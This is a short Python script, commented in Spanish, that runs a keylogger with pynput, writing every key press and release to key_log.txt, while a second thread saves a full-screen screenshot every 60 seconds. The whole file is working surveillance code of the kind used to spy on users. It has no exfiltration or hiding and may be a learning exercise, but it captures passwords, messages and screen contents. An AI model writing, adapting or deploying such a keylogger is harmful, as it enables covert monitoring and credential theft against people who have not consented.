import os
import time
from datetime import datetime
import threading
from pynput import keyboard
from PIL import ImageGrab

# Definir la carpeta donde se guardarán las capturas de pantalla
screenshot_folder = "screenshots"

# Crear la carpeta si no existe
if not os.path.exists(screenshot_folder):
    os.makedirs(screenshot_folder)

def on_press(key):
    try:
        with open("key_log.txt", "a") as f:
            f.write(f'Alphanumeric key {key.char} pressed\n')
    except AttributeError:
        with open("key_log.txt", "a") as f:
            f.write(f'Special key {key} pressed\n')

def on_release(key):
    with open("key_log.txt", "a") as f:
        f.write(f'Key {key} released\n')
    if key == keyboard.Key.esc:
        return False  # Stop listener

def take_screenshot():
    # Obtener la fecha y hora actual
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    # Definir el nombre del archivo con la fecha y hora
    screenshot_filename = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
    # Tomar la captura de pantalla y guardarla
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_filename)

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def start_screenshot_taker():
    while True:
        take_screenshot()
        time.sleep(60)  # Tomar una captura de pantalla cada 60 segundos

keylogger_thread = threading.Thread(target=start_keylogger)
screenshot_thread = threading.Thread(target=start_screenshot_taker)

keylogger_thread.start()
screenshot_thread.start()

keylogger_thread.join()
screenshot_thread.join()
